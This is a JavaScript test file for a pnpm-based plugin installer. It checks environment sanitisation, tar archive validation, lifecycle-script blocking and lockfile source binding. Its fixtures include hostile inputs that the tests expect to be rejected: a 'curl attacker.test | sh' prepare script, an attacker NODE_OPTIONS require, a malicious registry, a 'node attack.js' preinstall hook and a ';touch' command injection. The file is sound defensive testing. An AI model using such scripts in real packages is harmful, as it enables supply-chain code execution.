      'plugin', '--profile', 'web', 'remove', '--', '@example/exact-plugin',
    ]),
    /outside the fixed/u
  );
  assert.throws(
    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
      'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
      '--ignore-pnpmfile', '--', '/private/plugin.tgz',
    ], { expectedInstallSpec: '/private/different.tgz' }),
    /exact install spec/u
  );
  const dump = buildDshInvocation('/absolute/dsh-bin.js', [
    '--profile', 'web', '--dump-config',
  ]);
  assert.equal(dump.shell, false);
  const childEnv = buildChildEnvironment('/private/dsh-home', '/private/runtime', {
    PATH: '/trusted/bin',
    HOME: '/private/home',
    LANG: 'en_US.UTF-8',
    NODE_OPTIONS: '--require=/tmp/attacker.cjs',
    npm_config_registry: 'https://attacker.test',
    PNPM_HOME: '/tmp/attacker',
    AWS_SECRET_ACCESS_KEY: 'never-inherit',
    GITHUB_TOKEN: 'never-inherit',
  });
  assert.equal(Object.isFrozen(childEnv), true);
  assert.equal(childEnv.HOME, join('/private/runtime', 'home'));
  assert.equal(childEnv.USERPROFILE, join('/private/runtime', 'home'));
  assert.equal(childEnv.NPM_CONFIG_USERCONFIG, join('/private/runtime', 'empty-npmrc'));
  assert.equal(childEnv.GIT_CONFIG_GLOBAL, join('/private/runtime', 'empty-gitconfig'));
  assert.equal(childEnv.LANG, 'en_US.UTF-8');
  assert.equal(childEnv.PATH, '/trusted/bin');
  assert.equal(childEnv.DSH_HOME, '/private/dsh-home');
  assert.equal(Object.hasOwn(childEnv, 'NODE_OPTIONS'), false);
  assert.equal(Object.hasOwn(childEnv, 'npm_config_registry'), false);
  assert.equal(Object.hasOwn(childEnv, 'AWS_SECRET_ACCESS_KEY'), false);
  const windowsChildEnv = buildChildEnvironment(
    '/private/dsh-home',
    '/private/runtime',
    {
      Path: String.raw`C:\trusted\bin`,
      SystemRoot: String.raw`C:\Windows`,
      SECRET: 'never-inherit',
    },
    'win32'
  );
  assert.equal(windowsChildEnv.PATH, String.raw`C:\trusted\bin`);
  assert.equal(windowsChildEnv.SystemRoot, String.raw`C:\Windows`);
  assert.equal(Object.hasOwn(windowsChildEnv, 'Path'), false);
  assert.throws(
    () => buildChildEnvironment(
      '/private/dsh-home',
      '/private/runtime',
      { PATH: String.raw`C:\first`, Path: String.raw`C:\second` },
      'win32'
    ),
    /ambiguous Windows PATH entries/
  );
  assert.deepEqual(
    parsePluginInventory(JSON.stringify([{
      name: 'dsh-profile-web',
      private: true,
      dependencies: {
        zed: { from: 'zed', version: '2.0.0', path: '/private/not-retained' },
        alpha: { from: 'alpha', version: '1.0.0', path: '/private/not-retained' },
      },
    }])),
    { alpha: '1.0.0', zed: '2.0.0' }
  );
});

test('hosted archive binds SBOM/license and rejects lifecycle, traversal, polyglot tails, and dangerous metadata', () => {
  const fixture = hostedFixture();
  assert.equal(validateHostedArtifact(fixture.bytes, fixture.item).packageName, fixture.item.package.name);

  const changed = Buffer.from(fixture.bytes);
  changed[changed.length - 1] ^= 1;
  assert.throws(() => validateHostedArtifact(changed, fixture.item), /SHA-256 mismatch/);

  const lifecycleManifest = Buffer.from(JSON.stringify({
    name: fixture.item.package.name,
    version: fixture.item.package.version,
    license: fixture.item.rights.licenseExpression,
    scripts: { prepare: 'curl attacker.test | sh' },
    dsh: { bundle: { patch: fixture.item.package.bundlePatch } },
  }));
  const lifecycleBytes = tar([
    {
      name: 'package/package.json',
      body: lifecycleManifest,
    },
    { name: 'package/cordis.patch.yml', body: '[]\n' },
  ]);
  const lifecycleItem = structuredClone(fixture.item);
  lifecycleItem.distribution.artifactBytes = lifecycleBytes.length;
  lifecycleItem.distribution.artifactSha256 = sha256(lifecycleBytes);
  lifecycleItem.distribution.artifactIntegrity = integrity(sha256(lifecycleBytes));
  lifecycleItem.distribution.manifestSha256 = sha256(lifecycleManifest);
  assert.throws(() => validateHostedArtifact(lifecycleBytes, lifecycleItem), /forbidden prepare/);

  const traversal = tar([{ name: 'package/../escape', body: 'owned' }]);
  assert.throws(() => inspectTarEntries(traversal), /unsafe path/);
  const link = tar([{ name: 'package/link', body: '', type: '2' }]);
  assert.throws(() => inspectTarEntries(link), /forbidden link or special type/);
  const control = tar([{ name: 'package/bad\nname', body: 'owned' }]);
  assert.throws(() => inspectTarEntries(control), /unsafe path/);
  const dangerousMode = tar([{ name: 'package/tool', body: 'owned', mode: 0o4755 }]);
  assert.throws(() => inspectTarEntries(dangerousMode), /dangerous mode/);
  const collision = tar([
    { name: 'package/Readme', body: 'one' },
    { name: 'package/README', body: 'two' },
  ]);
  assert.throws(() => inspectTarEntries(collision), /case-colliding/);
  const raw = tar([{ name: 'package/file', body: 'ok' }], { compress: false });
  const tailed = Buffer.concat([raw, Buffer.alloc(512, 0x41)]);
  assert.throws(() => inspectTarEntries(tailed), /non-zero data after/);
  const hiddenName = Buffer.from(raw);
  hiddenName['package/file'.length + 1] = 0x41;
  refreshTarHeaderChecksum(hiddenName);
  assert.throws(() => inspectTarEntries(gzipSync(hiddenName)), /hidden bytes/u);
  const invalidUtf8 = Buffer.from(raw);
  invalidUtf8[8] = 0xff;
  refreshTarHeaderChecksum(invalidUtf8);
  assert.throws(() => inspectTarEntries(gzipSync(invalidUtf8)), /valid UTF-8/u);
  const badMagic = Buffer.from(raw);
  badMagic.write('broken\0', 257, 'binary');
  refreshTarHeaderChecksum(badMagic);
  assert.throws(() => inspectTarEntries(gzipSync(badMagic)), /POSIX ustar/u);
  const terminatorOffset = raw.length - 1024;
  const zeroGap = Buffer.concat([
    raw.subarray(0, terminatorOffset),
    Buffer.alloc(512),
    raw.subarray(0, terminatorOffset),
    raw.subarray(terminatorOffset),
  ]);
  assert.throws(() => inspectTarEntries(gzipSync(zeroGap)), /zero-block gap/u);

  const wrongSbom = structuredClone(fixture.item);
  wrongSbom.distribution.sbom.sha256 = '0'.repeat(64);
  assert.throws(() => validateHostedArtifact(fixture.bytes, wrongSbom), /SBOM.*digest/i);

  const wrongNotice = structuredClone(fixture.item);
  wrongNotice.distribution.noticeFile.sha256 = '0'.repeat(64);
  assert.throws(
    () => validateHostedArtifact(fixture.bytes, wrongNotice),
    /modification notice.*digest/i
  );

  const wrongLicense = structuredClone(fixture.item);
  wrongLicense.rights.licenseExpression = 'Apache-2.0';
  assert.throws(
    () => validateHostedArtifact(fixture.bytes, wrongLicense),
    /manifest identity, license/u
  );
});

test('prepare authorization rejects live builds and persists exact negative closure rules', () => {
  const upstream = gitFixture();
  assert.deepEqual(
    upstream.package.lifecycleAuthorization.authorizedHooks,
    ['prepare', 'install', 'postinstall']
  );
  const base = 'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n';
  const upstreamPolicy = resolvedLifecyclePolicy([upstream], ['transitive-build@4.5.6']);
  assert.throws(
    () => authorizePrepareText(base, [upstream], upstreamPolicy),
    /live lifecycle builds are forbidden/u
  );
  const noHook = hostedFixture({
    id: 3006,
    slug: 'no-hook-fixture',
    name: '@example/no-hook-plugin',
  }).item;
  const noHookPolicy = resolvedLifecyclePolicy([noHook], ['transitive-build@4.5.6']);
  const denied = authorizePrepareText(base, [noHook], noHookPolicy);
  assert.deepEqual(
    denied.deniedKeys,
    ['@example/no-hook-plugin@file:../../prepared/3006.tgz', 'transitive-build@4.5.6'].sort()
  );
  assert.match(denied.source, /"@example\/no-hook-plugin@file:\.\.\/\.\.\/prepared\/3006\.tgz": false/);
  assert.match(denied.source, /transitive-build@4\.5\.6: false/);
  assert.equal(denied.source.match(/#dsh-plugin-installer-owned-v1/gu)?.length, 2);
  assert.throws(
    () => authorizePrepareText(
      `${base}\nallowBuilds:\n  "@example/no-hook-plugin@file:../../prepared/3006.tgz": true\n`,
      [noHook],
      noHookPolicy
    ),
    /unexpected existing authorization/u
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nallowBuilds:\n  "@example/no-hook-plugin": true\n"allowBuilds": {}\n`, [noHook], noHookPolicy),
    /invalid|unique|map key/i
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nshared: &shared\n  x: true\nallowBuilds: *shared\n`, [noHook], noHookPolicy),
    /aliases are forbidden/
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nallowBuilds:\n  <<: { "@example/no-hook-plugin": true }\n`, [noHook], noHookPolicy),
    /merge keys are forbidden/
  );
  const injected = structuredClone(upstream);
  injected.package.lifecycleAuthorization.packageKey = '@example/dsh-plugin;touch';
  assert.throws(() => authorizePrepareText(base, [injected], upstreamPolicy), /authorization|malformed/);
  assert.throws(
    () => revokePrepareText(
      `${base}\nallowBuilds:\n  "@example/dsh-plugin": true\n  "@example/dsh-plugin@file:../../prepared/3052.tgz": true\n`,
      [upstream],
      upstreamPolicy
    ),
    /legacy broad lifecycle authorization.*explicit migration/u
  );
});

test('installer-owned negative lifecycle rules are cleaned only when the current lock no longer reaches them', () => {
  const workspaceSource = [
    'packages:',
    '  - .',
    'nodeLinker: hoisted',
    'autoInstallPeers: false',
    'dangerouslyAllowAllBuilds: false',
    'strictDepBuilds: true',
    'allowBuilds:',
    '  package-reachable@1.0.0: false #dsh-plugin-installer-owned-v1',
    '  snapshot-reachable@1.0.0: false #dsh-plugin-installer-owned-v1',
    '  stale@1.0.0: false #dsh-plugin-installer-owned-v1',
    '  user-denial@1.0.0: false',
    '  user-positive@1.0.0: true #dsh-plugin-installer-owned-v1',
    '  forged-marker@1.0.0: false #dsh-plugin-installer-owned-v1-extra',
    '',
  ].join('\n');
  const lockSource = [
    "lockfileVersion: '9.0'",
    'packages:',
    '  package-reachable@1.0.0:',
    '    resolution: {}',
    'snapshots:',
    '  snapshot-reachable@1.0.0(react@19.0.0): {}',
    '',
  ].join('\n');
  const result = cleanupInstallerOwnedAllowBuildsText(workspaceSource, lockSource);
  assert.deepEqual(result.removedKeys, ['stale@1.0.0']);
  assert.match(result.source, /package-reachable@1\.0\.0: false #dsh-plugin-installer-owned-v1/u);
  assert.match(result.source, /snapshot-reachable@1\.0\.0: false #dsh-plugin-installer-owned-v1/u);
  assert.match(result.source, /user-denial@1\.0\.0: false/u);
  assert.match(result.source, /user-positive@1\.0\.0: true #dsh-plugin-installer-owned-v1/u);
  assert.match(result.source, /forged-marker@1\.0\.0: false #dsh-plugin-installer-owned-v1-extra/u);
  assert.doesNotMatch(result.source, /stale@1\.0\.0/u);
  assert.match(result.source, /strictDepBuilds: true/u);
  assert.match(result.source, /dangerouslyAllowAllBuilds: false/u);
});

test('installer-owned allowBuilds cleanup atomically persists a bounded strict workspace', async (t) => {
  const root = await workspace(t);
  const profile = join(root, 'web');
  await mkdir(profile);
  await writeFile(join(profile, 'package.json'), `${JSON.stringify({
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  })}\n`);
  await writeFile(
    join(profile, 'pnpm-workspace.yaml'),
    [
      'packages:',
      '  - .',
      'nodeLinker: hoisted',
      'autoInstallPeers: false',
      'dangerouslyAllowAllBuilds: false',
      'strictDepBuilds: true',
      'allowBuilds:',
      '  stale@1.0.0: false #dsh-plugin-installer-owned-v1',
      '  user-denial@1.0.0: false',
      '',
    ].join('\n')
  );
  await writeFile(join(profile, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n");
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
  const result = await cleanupInstallerOwnedAllowBuilds(profile);
  assert.deepEqual(result.removedKeys, ['stale@1.0.0']);
  const persisted = await readFile(join(profile, 'pnpm-workspace.yaml'), 'utf8');
  assert.doesNotMatch(persisted, /stale@1\.0\.0/u);
  assert.match(persisted, /user-denial@1\.0\.0: false/u);
  assert.deepEqual(
    (await readdir(profile)).filter((name) => name.includes('.dsh-plugin-installer-')),
    []
  );
});

test('pnpm lifecycle policy resolves exact source depPaths and denies the new transitive closure', () => {
  const liveBuild = gitFixture();
  const item = locklessGitFixture();
  const directReference = item.distribution.source.installSpec;
  const gitSpecifier = `github:example/prebuilt-plugin#${item.distribution.source.commit}`;
  const gitTarball =
    `https://codeload.github.com/example/prebuilt-plugin/tar.gz/${item.distribution.source.commit}`;
  const directPackageKey = `${item.package.name}@${gitTarball}`;
  const directKey = `${directPackageKey}(react@18.3.1)`;
  const gitIntegrity = `sha512-${Buffer.alloc(64, 7).toString('base64')}`;
  const sourceContext = {
    profile: '/private/dsh/profiles/web',
    artifactIntegrities: [null],
  };
  const baseline = [
    "lockfileVersion: '9.0'",
    'importers:',
    '  .: {}',
    '',
  ].join('\n');
  const resolved = [
    "lockfileVersion: '9.0'",
    'importers:',
    '  .:',
    '    dependencies:',
    `      ${JSON.stringify(item.package.name)}:`,
    `        specifier: ${JSON.stringify(gitSpecifier)}`,
    `        version: ${JSON.stringify(`${gitTarball}(react@18.3.1)`)}`,
    'packages:',
    `  ${JSON.stringify(directPackageKey)}:`,
    '    resolution:',
    '      gitHosted: true',
    `      integrity: ${JSON.stringify(gitIntegrity)}`,
    `      tarball: ${JSON.stringify(gitTarball)}`,
    `    version: ${JSON.stringify(item.package.version)}`,
    '  transitive-build@4.5.6:',
    '    resolution: {}',
    'snapshots:',
    `  ${JSON.stringify(directKey)}: {}`,
    '  transitive-build@4.5.6: {}',
    '',
  ].join('\n');
  const policy = resolvePnpmLifecyclePolicy(
    baseline,
    resolved,
    [item],
    [directReference],
    sourceContext
  );
  assert.deepEqual(policy.directKeys, [{
    catalogId: item.catalogId,
    packageName: item.package.name,
    policyKey: directPackageKey,
    snapshotKey: directKey,
  }]);
  assert.deepEqual(policy.authorizedKeys, []);
  assert.deepEqual(policy.deniedKeys, [directPackageKey, 'transitive-build@4.5.6'].sort());
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replace(`version: ${JSON.stringify(item.package.version)}`, 'version: "9.9.9"'),
      [item],
      [directReference],
      sourceContext
    ),
    /version mismatch/u
  );
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved,
      [liveBuild],
      [directReference],
      sourceContext
    ),
    /live lifecycle build/u
  );
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved,
      [item],
      ['git+https://github.com/wrong/repo.git#' + 'f'.repeat(40)],
      sourceContext
    ),
    /Git source binding/u
  );
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline.replace("lockfileVersion: '9.0'", "lockfileVersion: '8.0'"),
      resolved,
      [item],
      [directReference],
      sourceContext
    ),
    /version must be exactly '9.0'/u
  );

  const patchPolicyKey = `${directPackageKey}(patch_hash=abc123)`;
  const patchSnapshotKey = `${patchPolicyKey}(react@18.3.1)`;
  const patched = resolved
    .replace(
      `version: ${JSON.stringify(`${gitTarball}(react@18.3.1)`)}`,
      `version: ${JSON.stringify(`${gitTarball}(patch_hash=abc123)(react@18.3.1)`)}`
    )
    .replace(JSON.stringify(directPackageKey), JSON.stringify(patchPolicyKey))
    .replace(JSON.stringify(directKey), JSON.stringify(patchSnapshotKey));
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      patched,
      [item],
      [directReference],
      sourceContext
    ),
    /source locator mismatch/u
  );

  const alreadyRelative = resolved.replace(
    `version: ${JSON.stringify(`${gitTarball}(react@18.3.1)`)}`,
    `version: ${JSON.stringify(directKey)}`
  );
  const alreadyRelativePolicy = resolvePnpmLifecyclePolicy(
    baseline,
    alreadyRelative,
    [item],
    [directReference],
    sourceContext
  );
  assert.equal(alreadyRelativePolicy.directKeys[0].snapshotKey, directKey);

  const otherTarball = `https://codeload.github.com/example/other/tar.gz/${item.distribution.source.commit}`;
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replaceAll(gitTarball, otherTarball),
      [item],
      [directReference],
      sourceContext
    ),
    /source locator mismatch/u
  );
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replace('gitHosted: true', 'gitHosted: false'),
      [item],
      [directReference],
      sourceContext
    ),
    /gitHosted mismatch/u
  );
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replace(gitIntegrity, `sha256-${Buffer.alloc(32, 1).toString('base64')}`),
      [item],
      [directReference],
      sourceContext
    ),
    /canonical SHA-512 integrity/u
  );
});

test('pnpm lifecycle policy binds local tarballs to profile-relative locator and staged SHA-512', () => {
  const item = hostedFixture().item;
  const profile = '/private/dsh/profiles/web';
  const artifact = '/private/transaction/prepared-staging/3006/plugin.tgz';
  const locator = `file:${relative(profile, artifact).replaceAll('\\', '/')}`;
  const artifactIntegrity = `sha512-${Buffer.alloc(64, 9).toString('base64')}`;
  const packageKey = `${item.package.name}@${locator}`;
  const baseline = "lockfileVersion: '9.0'\nimporters:\n  .: {}\n";
  const resolved = [
    "lockfileVersion: '9.0'",
    'importers:',
    '  .:',
    '    dependencies:',
    `      ${JSON.stringify(item.package.name)}:`,
    `        specifier: ${JSON.stringify(`file:${artifact}`)}`,
    `        version: ${JSON.stringify(locator)}`,
    'packages:',
    `  ${JSON.stringify(packageKey)}:`,
    '    resolution:',
    `      integrity: ${JSON.stringify(artifactIntegrity)}`,
    `      tarball: ${JSON.stringify(locator)}`,
    `    version: ${JSON.stringify(item.package.version)}`,
    'snapshots:',
    `  ${JSON.stringify(packageKey)}: {}`,
    '',
  ].join('\n');
  const context = { profile, artifactIntegrities: [artifactIntegrity] };
  const policy = resolvePnpmLifecyclePolicy(
    baseline,
    resolved,
    [item],
    [artifact],
    context
  );
  assert.equal(policy.directKeys[0].policyKey, packageKey);

  const poisonedLocator = 'file:../../../transaction/poisoned.tgz';
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replaceAll(locator, poisonedLocator),
      [item],
      [artifact],
      context
    ),
    /source locator mismatch/u
  );
  const poisonedIntegrity = `sha512-${Buffer.alloc(64, 10).toString('base64')}`;
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replace(artifactIntegrity, poisonedIntegrity),
      [item],
      [artifact],
      context
    ),
    /resolution integrity mismatch/u
  );
  assert.throws(
    () => resolvePnpmLifecyclePolicy(
      baseline,
      resolved.replace(
        `tarball: ${JSON.stringify(locator)}`,
        `tarball: ${JSON.stringify(poisonedLocator)}`
      ),
      [item],
      [artifact],
      context
    ),
    /resolution tarball mismatch/u
  );
});

test('profile resolution surface rejects lifecycle and pnpm configuration injection', async (t) => {
  const root = await workspace(t);
  const profile = join(root, 'web');
  await mkdir(profile);
  const manifest = {
    name: 'dsh-profile-web',
    private: true,
    dependencies: {},
    dsh: {
      profile: {
        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
        patchReload: 'live',
      },
    },
  };
  const manifestPath = join(profile, 'package.json');
  const workspacePath = join(profile, 'pnpm-workspace.yaml');
  await writeFile(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
  await writeFile(join(profile, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n");
  await writeFile(
    workspacePath,
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );
  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
  assert.equal((await validateProfileResolutionSurface(profile)).profile, await realpath(profile));

  const installedManifest = structuredClone(manifest);
  installedManifest.dependencies['dsh-installed-fixture'] = '1.0.0';
  installedManifest.dsh.profile.bundles.push('dsh-installed-fixture');
  await writeFile(manifestPath, `${JSON.stringify(installedManifest)}\n`);
  await mkdir(join(profile, 'node_modules', 'dsh-installed-fixture'), { recursive: true });
  await writeFile(
    join(profile, 'node_modules', 'dsh-installed-fixture', 'package.json'),
    `${JSON.stringify({ name: 'dsh-installed-fixture', version: '1.0.0' })}\n`
  );
  assert.equal((await validateProfileResolutionSurface(profile)).profile, await realpath(profile));
  assert.deepEqual((await captureProfileClosure(profile)).bundles, [
    '@deepseek-ai/dsh-base',
    '@deepseek-ai/dsh-web-app',
    'dsh-installed-fixture',
  ]);
  await writeFile(manifestPath, `${JSON.stringify(manifest)}\n`);

  await writeFile(workspacePath, 'packages:\n  - .\n\nautoInstallPeers: false\n');
  await assert.rejects(() => validateProfileResolutionSurface(profile), /nodeLinker must be hoisted/u);
  await writeFile(workspacePath, 'packages:\n  - .\n\nnodeLinker: hoisted\n');
  await assert.rejects(() => validateProfileResolutionSurface(profile), /autoInstallPeers must be false/u);
  await writeFile(
    workspacePath,
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
  );

  await writeFile(manifestPath, `${JSON.stringify({ ...manifest, scripts: { preinstall: 'node attack.js' } })}\n`);
  await assert.rejects(() => validateProfileResolutionSurface(profile), /manifest scripts/u);
  await writeFile(manifestPath, `${JSON.stringify(manifest)}\n`);

  await writeFile(join(profile, '.pnpmfile.cjs'), 'module.exports = {}\n');
  await assert.rejects(() => validateProfileResolutionSurface(profile), /project configuration/u);
  await rm(join(profile, '.pnpmfile.cjs'));

  await writeFile(
    workspacePath,
    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\ncatalog:\n  injected: latest\n'
  );
  await assert.rejects(() => validateProfileResolutionSurface(profile), /outside the fixed resolution surface/u);
});

test('install transaction resolves lockfile depPaths with scripts disabled before authorization', async () => {
  const materialize = buildDshInvocation('/absolute/dsh-bin.js', [
    'plugin', '--profile', 'web', 'install', '--frozen-lockfile',
    '--ignore-scripts', '--ignore-pnpmfile',
  ]);
  assert.deepEqual(materialize.args.slice(1), [
    'plugin', '--profile', 'web', 'install', '--frozen-lockfile',
    '--ignore-scripts', '--ignore-pnpmfile',
  ]);
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', [
      'plugin', '--profile', 'web', 'install', '--frozen-lockfile',
    ]),
    /outside the fixed/u
  );
  const frozenLock = Buffer.from("lockfileVersion: '9.0'\n");
  assert.match(verifyFrozenLockfileBytes(frozenLock, Buffer.from(frozenLock)), /^[a-f0-9]{64}$/u);
  assert.throws(
    () => verifyFrozenLockfileBytes(
      frozenLock,
      Buffer.from("lockfileVersion: '9.0'\npackages: {}\n")
    ),
    /changed the resolved lockfile bytes/u
  );
  const source = await readFile(
    new URL('../skills/dsh-plugin-installer/scripts/install-transaction.mjs', import.meta.url),
    'utf8'
  );
  const resolution = source.indexOf("'add', '--save-exact', '--ignore-scripts', '--lockfile-only'");
  const authorization = source.indexOf('await authorizePrepare(profile, items, {');
  const materialization = source.indexOf("'--frozen-lockfile',", authorization);
  assert.ok(resolution > 0);
  assert.ok(authorization > resolution);
  assert.ok(materialization > authorization);
  assert.match(source, /baselinePnpmLockSource[\s\S]*baselineLockSource: baselinePnpmLockSource/u);
});

test('removal resolves every reverse operation lockfile-only before one frozen materialization', async () => {
  const source = await readFile(
    new URL('../skills/dsh-plugin-installer/scripts/install-transaction.mjs', import.meta.url),
    'utf8'
  );
  const removalExecutor = source.slice(
    source.indexOf('export async function executeRemovalTransaction'),
    source.indexOf('export async function executeRecoveryTransaction')
  );
  const reverseRemoval = removalExecutor.indexOf('for (const item of [...items].reverse())');
  const resolvedLock = removalExecutor.indexOf('const resolvedRemovalLockBytes', reverseRemoval);
  const resolutionBlock = removalExecutor.slice(reverseRemoval, resolvedLock);
  const materialization = removalExecutor.indexOf("'--frozen-lockfile'", resolvedLock);
  const lockVerification = removalExecutor.indexOf(
    'verifyFrozenLockfileBytes(resolvedRemovalLockBytes, materializedLockBytes)',
    materialization
  );
  const policyCleanup = removalExecutor.indexOf(
    'await cleanupInstallerOwnedAllowBuilds(profile)',
    lockVerification
  );
  const absenceVerification = removalExecutor.indexOf(
    'for (const item of items) await verifyRemoved(profile, item)',
    policyCleanup
  );
  assert.ok(reverseRemoval > 0);
  assert.match(resolutionBlock, /'--lockfile-only'/u);
  assert.match(resolutionBlock, /'--'/u);
  assert.doesNotMatch(resolutionBlock, /--ignore-scripts|--ignore-pnpmfile/u);
  assert.ok(resolvedLock > reverseRemoval);
  assert.ok(materialization > resolvedLock);
  assert.equal(removalExecutor.match(/'--frozen-lockfile'/gu)?.length, 1);
  assert.ok(lockVerification > materialization);
  assert.ok(policyCleanup > lockVerification);
  assert.ok(absenceVerification > policyCleanup);
});

test('upstream preparation rejects an undisclosed standard lifecycle hook despite exact commit and manifest digests', async (t) => {
  const root = await workspace(t);
  const checkout = join(root, 'checkout');
  await mkdir(checkout);
  const item = gitFixture();
  const manifest = {
    name: item.package.name,
    version: item.package.version,
    scripts: {
      prepare: item.package.lifecycle.hooks.prepare,
      install: item.package.lifecycle.hooks.install,
      postinstall: item.package.lifecycle.hooks.postinstall,
      preinstall: 'node unexpected-preinstall.js',
    },
    dsh: { bundle: { patch: item.package.bundlePatch } },
  };
  const manifestBytes = Buffer.from(`${JSON.stringify(manifest, null, 2)}\n`);
  await writeFile(join(checkout, 'package.json'), manifestBytes);
  await writeFile(join(checkout, item.package.bundlePatch), '[]\n');
  const lockfileBytes = Buffer.from('lockfileVersion: 9.0\n');
  await writeFile(join(checkout, item.distribution.source.lockfilePath), lockfileBytes);
  const git = (...args) => {
    const result = spawnSync('git', ['-C', checkout, ...args], { encoding: 'utf8' });
    assert.equal(result.status, 0, result.stderr);
    return result.stdout.trim();
  };
  git('init', '-q');
  git('config', 'user.name', 'Fixture');
  git('config', 'user.email', 'fixture@example.invalid');
  git('remote', 'add', 'origin', item.distribution.source.repository);
  git('add', '.');
  git('commit', '-qm', 'fixture');
  item.distribution.source.commit = git('rev-parse', 'HEAD');
  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
  item.distribution.source.installSpec = `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
  item.distribution.source.manifestSha256 = sha256(manifestBytes);
  item.distribution.source.lockfileSha256 = sha256(lockfileBytes);
  await assert.rejects(
    () => prepareUpstream({ item, checkout, output: join(root, 'prepared') }),
    /lifecycle hook map/
  );
});

test('lockless exact Git preparation admits only prebuilt packages without runtime or peer dependencies', async (t) => {
  const root = await workspace(t);
  const checkout = join(root, 'checkout');
  await mkdir(checkout);
  const item = locklessGitFixture();
  const manifest = {
    name: item.package.name,
    version: item.package.version,
    files: ['lib', item.package.bundlePatch],
    dsh: { bundle: { patch: item.package.bundlePatch } },
  };
  const manifestBytes = Buffer.from(`${JSON.stringify(manifest, null, 2)}\n`);
  await writeFile(join(checkout, 'package.json'), manifestBytes);
  await writeFile(join(checkout, item.package.bundlePatch), '[]\n');
  await mkdir(join(checkout, 'lib'));
  await writeFile(join(checkout, 'lib', 'index.js'), 'export const name = "fixture"\n');
  const git = (...args) => {
    const result = spawnSync('git', ['-C', checkout, ...args], { encoding: 'utf8' });
    assert.equal(result.status, 0, result.stderr);
    return result.stdout.trim();
  };
  git('init', '-q');
  git('config', 'user.name', 'Fixture');
  git('config', 'user.email', 'fixture@example.invalid');
  git('remote', 'add', 'origin', item.distribution.source.repository);
  git('add', '.');
  git('commit', '-qm', 'safe prebuilt fixture');
  item.distribution.source.commit = git('rev-parse', 'HEAD');
  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
  item.distribution.source.installSpec =
    `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
  item.distribution.source.manifestSha256 = sha256(manifestBytes);

  await prepareUpstream({ item, checkout, output: join(root, 'prepared') });
  const prepared = await validatePrepared(join(root, 'prepared'), item);
  assert.equal(prepared.record.sourceType, 'git-commit');
  assert.equal(prepared.record.evidence.lockfileSha256, null);

  const dependentManifestBytes = Buffer.from(`${JSON.stringify({
    ...manifest,
    dependencies: { leftPad: '1.0.0' },
  }, null, 2)}\n`);
  await writeFile(join(checkout, 'package.json'), dependentManifestBytes);
  git('add', 'package.json');
  git('commit', '-qm', 'unsafe lockless dependency');
  item.distribution.source.commit = git('rev-parse', 'HEAD');
  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
  item.distribution.source.installSpec =
    `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
  item.distribution.source.manifestSha256 = sha256(dependentManifestBytes);
  await assert.rejects(
    () => prepareUpstream({ item, checkout, output: join(root, 'rejected') }),
    /lockless Git source must be prebuilt/
  );

  const peerDependentManifestBytes = Buffer.from(`${JSON.stringify({
    ...manifest,
    peerDependencies: { react: '18.3.1' },
  }, null, 2)}\n`);
  await writeFile(join(checkout, 'package.json'), peerDependentManifestBytes);
  git('add', 'package.json');
  git('commit', '-qm', 'unsafe lockless peer dependency');
  item.distribution.source.commit = git('rev-parse', 'HEAD');
  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
  item.distribution.source.installSpec =
    `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
  item.distribution.source.manifestSha256 = sha256(peerDependentManifestBytes);
  await assert.rejects(
    () => prepareUpstream({ item, checkout, output: join(root, 'rejected-peer') }),
    /lockless Git source must be prebuilt/
  );

  assert.equal(manifestHasRuntimeDependencyGraph({ peerDependencies: {} }), false);
  assert.equal(manifestHasRuntimeDependencyGraph({ peerDependenciesMeta: {} }), false);
  assert.equal(
    manifestHasRuntimeDependencyGraph({
      peerDependenciesMeta: { react: { optional: true } },
    }),
    true
  );
});

test('exact npm preparation binds package@version, registry metadata, tarball identity, and integrity', async (t) => {
  const root = await workspace(t);
  const fixture = upstreamArtifactFixture();
  const artifact = join(root, 'npm-plugin.tgz');
  const metadata = join(root, 'metadata.json');
  await writeFile(artifact, fixture.bytes);
  await writeFile(metadata, fixture.metadataBytes);
  assert.equal(validateUpstreamArtifact(fixture.bytes, fixture.item).version, '2.3.4');
  await prepareUpstream({
    item: fixture.item,
    artifact,
    resolution: metadata,
    output: join(root, 'prepared'),
  });
  const prepared = await validatePrepared(join(root, 'prepared'), fixture.item);
  assert.equal(prepared.record.sourceType, 'npm-package-version');
